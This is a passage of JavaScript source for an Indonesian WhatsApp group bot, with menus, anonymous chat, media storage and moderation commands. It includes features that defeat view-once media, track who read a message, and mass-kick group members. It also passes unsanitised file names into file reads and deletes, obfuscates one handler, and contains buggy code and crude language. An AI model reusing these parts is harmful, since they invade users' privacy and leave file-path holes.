										"description": "\n\n_choose this if you want to know source code this bot_",
										"rowId": "source code"
									}]},							
						]
					}}, {})
client.relayWAMessage(ido, {waitForAck: true})
                break;
				case 'help':
        case  'menu':
   menu =` XTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}menu2`, buttonText: {displayText: 'MENU'}, type: 1},
	{buttonId: `${prefix}owner`, buttonText: {displayText: 'OWNER'}, type: 1},
	{buttonId: `${prefix}anonymous`, buttonText: {displayText: 'ANONYMOUS'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `                 
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
 
 *Please try other features that have been provided by the bot*

*Warning* 
-no calls/vc bots 
-no spam bots/pause 5 seconds 
-not allowed to enter bots in any group (owner's permission) 
-Do not use adult features for children under 18 years old -use bots wisely 

*be a good user and obey the rules* 
You can see other menus for yourself by typing !menu2

 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ] 
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
              client.relayWAMessage(prep)
               break;
case 'anonymous':
   menu =` XTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}start`, buttonText: {displayText: 'START'}, type: 1},
	{buttonId: `${prefix}next`, buttonText: {displayText: 'NEXT'}, type: 1},
	{buttonId: `${prefix}leave`, buttonText: {displayText: 'LEAVE'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `                 
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
    
▢ ketik start untuk memulai chat anonymous
▢ ketik next untuk memilih random chat
▢ ketik leave untuk berhenti 
 
 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ] 
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

 ️ꪶ𖣂ꫂ IDO ボ GANZ`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
              client.relayWAMessage(prep)
               break;			   
                case 'groupbutton': 
                let pi = client.prepareMessageFromContent(from, {
           "listMessage": {
						"title":  `Hai Kak😎 ${pushname}`,
						"description": `List menu bot ada disini kak silahkan di pilih`,
						"buttonText": "SELECT HERE",
						"footerText": `ꪶ𖣂ꫂ IDO ボ GANZ 〽`,
						"listType": "SINGLE_SELECT",
						"sections": [
						{
								"title": "◉ All menu bot",
								"rows": [
									{
										"title": "!add",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-1",
								"rows": [
									{
										"title": "!kick",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-2",
								"rows": [
									{
										"title": "!closetime",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-3",
								"rows": [
									{
										"title": "!opentime",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-4",
								"rows": [
									{
										"title": "!radd",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-5",
								"rows": [
									{
										"title": "!promote",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-6",
								"rows": [
									{
										"title": "!demote",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-7",
								"rows": [
									{
										"title": "!sider",																				
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-8",
								"rows": [
									{
										"title": "!revoke",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-9",
								"rows": [
									{
										"title": "!listonline",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-10",
								"rows": [
									{
										"title": "!tagal",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-11",
								"rows": [
									{
										"title": "!linkgroup",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-12",
								"rows": [
									{
										"title": "!antiviewonce",																				
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-13",
								"rows": [
									{
										"title": "!antilink",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-14",
								"rows": [
									{
										"title": "!antivirtex",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu ke-15",
								"rows": [
									{
										"title": "!grup",										
										"rowId": "0"
									}]},
							{
								"title": "◉ Source script bot",
								"rows": [
									{
										"title": "!antihidetag",										
										"rowId": ""
									}]},
							{
								"title": "◉ Contribution",
								"rows": [
									{
										"title": "!setdesc",										
										"rowId": "0"
									}]}
						]
					}}, {})
 client.relayWAMessage(pi, {waitForAck: true})
                break;                 
               case 'infoig':
             reply(`Jangan Lupa Follow Ig Owner Ya : https://www.instagram.com/ido.ganz/`)
             break;
      case 'xtreamgroup':
             reply('https://chat.whatsapp.com/J5oB4HmTgsZIl2lMoFC0U4')
             break;      
              case 'sourcecode': 
       case 'sc': 
       case 'src':
              reply(`nyari sc? silahkan chat pribadi ke saya😎 harga murah🛒 https://wa.me/6285609217332?text=kak+mau+beli+sc+bot`)
              break;
      case 'rules':
             client.sendMessage(from, rulesBot(prefix), MessageType.text, {quoted: ftroli})
             break;             
       case 'admin':
            case 'owner':
            case 'creator':
            case 'developer':
                  client.sendMessage(from, {displayname: "idoganz", vcard: vcard}, MessageType.contact, { quoted: mek})                  
					break;
				case 'next': 
				case 'leave': 
				case "stop": {
  if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
  client.anonymous = client.anonymous ? client.anonymous: {}
  let room = Object.values(client.anonymous).find(room => room.check(sender))
  if (!room) {
    await client.sendButton(from, '_Kamu tidak sedang berada di anonymous chat_', `${client.user.name}`, 'Cari Partner', !start)
    return false
  }
  reply('_You stopped matchmaking_')
  let other = room.other(sender)
  if (other) await client.sendButton(other, '_Partner meninggalkan chat_', `${client.user.name}`, 'Cari Partner', !start)
  delete client.anonymous[room.id]
  if (command === 'leave' || command === "stop") break;
  }	
	 case 'mulai': case 'start': {
    function _0x4ced(_0x26df28,_0x2803c1){const _0x473fe8=_0x473f();return _0x4ced=function(_0x4ceda8,_0x1b4cc8){_0x4ceda8=_0x4ceda8-0x11b;let _0x12b73e=_0x473fe8[_0x4ceda8];return _0x12b73e;},_0x4ced(_0x26df28,_0x2803c1);}const _0x405733=_0x4ced;(function(_0x300bed,_0x586abc){const _0x33b7b0=_0x4ced,_0x1a4406=_0x300bed();while(!![]){try{const _0x5a0048=parseInt(_0x33b7b0(0x11c))/0x1+parseInt(_0x33b7b0(0x130))/0x2+parseInt(_0x33b7b0(0x122))/0x3+parseInt(_0x33b7b0(0x127))/0x4*(parseInt(_0x33b7b0(0x121))/0x5)+-parseInt(_0x33b7b0(0x120))/0x6*(-parseInt(_0x33b7b0(0x12c))/0x7)+-parseInt(_0x33b7b0(0x129))/0x8*(parseInt(_0x33b7b0(0x125))/0x9)+-parseInt(_0x33b7b0(0x133))/0xa;if(_0x5a0048===_0x586abc)break;else _0x1a4406['push'](_0x1a4406['shift']());}catch(_0x1ca654){_0x1a4406['push'](_0x1a4406['shift']());}}}(_0x473f,0x6ae2a));if(isGroup)return reply(_0x405733(0x132));client['anonymous']=client[_0x405733(0x123)]?client[_0x405733(0x123)]:{};if(Object[_0x405733(0x124)](client[_0x405733(0x123)])[_0x405733(0x12f)](_0x178b40=>_0x178b40[_0x405733(0x11d)](sender)))return await client['sendButton'](from,_0x405733(0x134),''+client[_0x405733(0x12e)][_0x405733(0x11e)],_0x405733(0x11f),prefix+_0x405733(0x128)),![];function _0x473f(){const _0x4e6de6=['Fitur\x20Tidak\x20Dapat\x20Digunakan\x20Untuk\x20Group!','9451550waXPze','_Kamu\x20masih\x20berada\x20di\x20dalam\x20anonymous\x20chat,\x20menunggu\x20partner_','next','379965XKLrBX','check','name','Keluar','2116896NIxGSN','5ChzmCQ','2081205enbxLg','anonymous','values','2282481SiUvps','state','100276QDPPFD','leave','24rjOrEp','sendButton','Next','14eOkxPf','_Partner\x20ditemukan!_','user','find','678766kWbzdL','CHATTING'];_0x473f=function(){return _0x4e6de6;};return _0x473f();}let room=Object['values'](client[_0x405733(0x123)])['find'](_0x20f7ab=>_0x20f7ab[_0x405733(0x126)]==='WAITING'&&!_0x20f7ab['check'](sender));if(room)await client[_0x405733(0x12a)](room['a'],_0x405733(0x12d),''+client[_0x405733(0x12e)][_0x405733(0x11e)],_0x405733(0x12b),prefix+_0x405733(0x11b)),room['b']=sender,room[_0x405733(0x126)]=_0x405733(0x131),await client[_0x405733(0x12a)](room['b'],_0x405733(0x12d),''+client['user']['name'],_0x405733(0x12b),prefix+'next');else{let id=+new Date();client[_0x405733(0x123)][id]={'id':id,'a':sender,'b':'','state':'WAITING','check':function(_0x5be9e1=''){return[this['a'],this['b']]['includes'](_0x5be9e1);},'other':function(_0x1e1c71=''){return _0x1e1c71===this['a']?this['b']:_0x1e1c71===this['b']?this['a']:'';}},await client[_0x405733(0x12a)](from,'_Menunggu\x20partner..._',''+client['user']['name'],_0x405733(0x11f),prefix+_0x405733(0x128));}
    break
   }
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
      case "setcmd":
        if (isQuotedSticker) {
          if (!q)
            return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`);
          var kodenya =
            mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              "base64"
            );
          addCmd(kodenya, q);
          fakestatus("Done!");
        } else {
          reply("tag stickenya");
        }
        break;		
      case '3634':
      	thumbnail: fs.readFileSync('./stik/fake.jpeg');	                         
       client.sendMessage(from, allmenu(), text, {quoted: ftroli})
	   break;
      case "delcmd":
        if (!isQuotedSticker)
          return reply(`Penggunaan : ${command} tagsticker`);
        var kodenya =
          mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            "base64"
          );
        _scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
        fakestatus("Done!");
        break;
      case "listcmd":
        teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
        cemde = [];
        for (let i of _scommand) {
          cemde.push(i.id);
          teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break;
      //------------------< Fitur Fun >-------------------

      //------------------< Fitur Anti antian >-------------------
      case "antilink":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntilink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;       
case 'add':
if (!isGroupAdmins && !isOwner) return reply(`ONLY ADMIN GROUP`)
orang = args[0] + '@s.whatsapp.net'
response = await client.groupAdd(from, [orang])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Orang yang anda add sudah ada didalam Group!')
else if(inv[0].code == 403){
client.sendMessage(from, `𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝙸𝚂 𝙿𝚁𝙸𝚅𝙰𝚃𝙴,𝚖𝚎𝚗𝚐𝚒𝚛𝚒𝚖 𝚞𝚗𝚍𝚊𝚗𝚐𝚊𝚗 𝚐𝚛𝚘𝚞𝚙@${q.split('@')[0]}`, MessageType.text, {quoted: mek, contextInfo: {mentionedJid: [orang]}})
client.sendGroupV4Invite(from, orang, inv[0].invite_code, inv[0].invite_code_exp, groupMetadata.subject , `Admin mengundang anda untuk bergabung digroup `)
}
break;
case 'rkick':
  if (!mek.key.fromMe) return fakestatus("SELF-BOT");
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Kick!')
mentioned = client.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
client.groupRemove(from, mentioned)
break;
      case "antihidetag":       
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIVIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;

      case "autojoin":
        if (!isGroup) return reply("Khusus di grup");
        if (!mek.key.fromMe) return reply("Khusus owner");
        if (args[0] == "on") {
          if (autojoin == true) return reply("Sudah aktif!!");
          autojoin = true;
          reply("Sukses mengaktifkan autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          reply("Sukses mematikan autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}autojoin on`,
              buttonText: {
                displayText: `ON 😎`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}autojoin off`,
              buttonText: {
                displayText: `OFF 🚫`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antivirtex":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntivirtex) return reply("Sudah aktif!!");
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antivirtex!");
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(ant));
          reply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "kickarea":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `ON 🛒`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `OFF 🚬`,
              },
              type: 1,
            },
          ]);
        }
        break;
		case 'setppgrup':
              if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
              if (isQuotedImage) {
              let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
              let media = await client.downloadMediaMessage(encmedia)
              client.updateProfilePicture(from, media)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              } else {
              reply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
}
              break;

      //------------------< Fitur Grup >-------------------
      case "listonline": //copas dari stikerinbot
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [
            ...Object.keys(client.chats.get(id).presences),
            client.user.jid,
          ];
          client.reply(
            m.chat,
            "┌─〔 Daftar Online 〕\n" +
              online.map((v) => "├ @" + v.replace(/@.+/, "")).join`\n` +
              "\n└────",
            m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
        } catch (e) {
          m.reply("");
        }
        break;

      case "sider": //copas dari stikerinbot
        if (!m.quoted) throw `Balas pesan bot!`;
        let members = m.quoted.chat.endsWith("g.us")
          ? (await client.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith("@broadcast")
          ? -1
          : 1;
        let { reads, deliveries } = await client.messageInfo(
          m.quoted.chat,
          m.quoted.id
        );
        let txt = `
*Dibaca oleh:*
${reads
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `@${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length} tersisa` : ""}

*Terkirim ke:*
${deliveries
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
`.trim();
        m.reply(txt, null, {
          contextInfo: {
            mentionedJid: client.parseMention(txt),
          },
        });
        break;
      case "q":
        if (!m.quoted) return reply("reply message!");
        let qse = client.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break;
      case "kick":
       if (!mek.key.fromMe) return fakestatus(" kick sendiri kontol");  
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Tag target yang ingin di kick!");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          client.groupRemove(from, mentioned);
          await sleep(1000)
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          client.groupRemove(from, [anu]);
          await sleep(1000)
        } else {
          client.groupRemove(from, mentioned);
          await sleep(1000)
        }
        break;
	//storage
					case 'addvn':
				
					if (!isQuotedAudio) return reply('Reply Audio Nya')
					svst = body.slice(7)
					if (!svst) return reply('Nama audionya?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await client.downloadMediaMessage(boij)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./src/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./src/audio.json', JSON.stringify(audionye))
					client.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}vnlist`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return reply('khusus owner')
					try {
					 nmm = body.slice(7)
					 wanu = audionye.indexOf(nmm)
					 audionye.splice(wanu, 1)
					 fs.unlinkSync(`./src/audio/${nmm}.mp3`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply('ok')
					}
					break
               case 'vnlist':
				case 'listvn':
				
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `❑ ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*  \n\n\n\n◉ Cara Ambil Audionya :\n${prefix}Getvn NameVN`
					client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
             case 'getvn':
             case 'gvn':
             
					namastc = body.slice(7)
					buffer = fs.readFileSync(`./src/audio/${namastc}.mp3`)
					client.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
					break
             case 'addimg':
				
					if (!isQuotedImage) return reply('Reply imagenya!')
					svst = body.slice(8)
					if (!svst) return reply('Nama imagenya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await client.downloadMediaMessage(boij)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./src/image/${svst}.jpeg`, delb)
					fs.writeFileSync('./src/image.json', JSON.stringify(imagenye))
					client.sendMessage(from, `Sukses Menambahkan Image\nCek dengan cara ${prefix}imglist`, MessageType.text, { quoted: mek })
					break
					case 'delimg':
					if (!isOwner && !mek.key.fromMe) return reply('khusus owner')
					try {
					 nmm = body.slice(7)
					 wanu = imagenye.indexOf(nmm)
					 imagenye.splice(wanu, 1)
					 fs.unlinkSync(`./src/image/${nmm}.jpeg`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply('ok')
					}
					break;
            case 'imglist':
				case 'listimg':
				
					teks = '*List Image :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `❑ ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*  \n\n\n\n◉ Cara Ambil Image :\n${prefix}getimg ImageName`
					client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
            case 'getimg':
            
					namastc = body.slice(8)
					buffer = fs.readFileSync(`./src/image/${namastc}.jpeg`)
					client.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From Database : ${namastc}.jpeg` })
					break
            case 'addvid':
				
					if (!isQuotedVideo) return reply('Reply videonya!')
					svst = body.slice(8)
					if (!svst) return reply('Nama videonya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await client.downloadMediaMessage(boij)
					videonye.push(`${svst}`)
					fs.writeFileSync(`./src/video/${svst}.mp4`, delb)
					fs.writeFileSync('./src/video.json', JSON.stringify(videonye))
					client.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}vidlist`, MessageType.text, { quoted: mek })
					break;
					case 'delvid':
					if (!isOwner && !mek.key.fromMe) return reply('khusus owner')
					try {
					 nmm = body.slice(7)
					 wanu = videonye.indexOf(nmm)
					 videonye.splice(wanu, 1)
					 fs.unlinkSync(`./src/image/${nmm}.jpeg`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply('ok')
					}
					break;
             case 'vidlist':
				case 'listvid':
				
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `❑ ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}*  \n\n\n\n◉ Cara Ambil Video :\n${prefix}getvid VidName`
					client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": videonye } })
					break;
             case 'getvid':
             case 'gvid':
                    
					namastc = body.slice(8)
					buffer = fs.readFileSync(`./src/video/${namastc}.mp4`)
					client.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: mek })
					break;
      case 'add2':
               if (!mek.key.fromMe) return fakestatus("SELF-BOT");   
                if (args.length < 1) return reply('Yang mau di add jin ya?')
                if (args[0].startsWith('08')) return reply('Gunakan kode negara kak')
                try {
                num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
                client.groupAdd(from, [num])
                } catch (e) {
                console.log('Error :', e)
                reply('Gagal menambahkan target, mungkin karena di private')
                }
                break;        
        case 'kickall':
                client.updatePresence(from, Presence.composing) 
               if (!mek.key.fromMe) return fakestatus("SELF-BOT");                
                let mid = []
                for (let memb of groupMembers){
                    mid.push(memb.jid)
                }
                let u = mid.length
                for (let i = 0; i < mid.length; i++){
                    if (groupAdmins.includes(mid[i])){
                    console.log('Cannot kick admin' + mid[i])
                    } else {
                    client.groupRemove(from, [mid[i]])
                    await sleep(1000)
                    }
                }
			    break;
			    case 'caklontong'://Subscribe Hans BOT & Msz Pro			        
					anu = await fetchJson(`https://janbot-api.herokuapp.com/api/kuis/caklontong`, {method: 'get'})
					setTimeout( () => {
				    client.sendMessage(from, '*◉ Jawaban :* '+anu.result.jawaban+'\n'+anu.result.deskripsi, text, {quoted: mek })
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 40000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_40 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, anu.result.soal, text, {quoted: mek })
					}, 0) // 1000 = 1s,
					break;
					case 'tebakkimia'://Subscribe Hans BOT & Msz Pro			         
					anu = await fetchJson(`https://janbot-api.herokuapp.com/api/kuis/tebakkimia`, {method: 'get'})
					setTimeout( () => {
				    client.sendMessage(from, '*◉ Jawaban :* '+anu.lambang, text, {quoted: mek })
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 40000) // 1000 = 1s,
					setTimeout( () => {
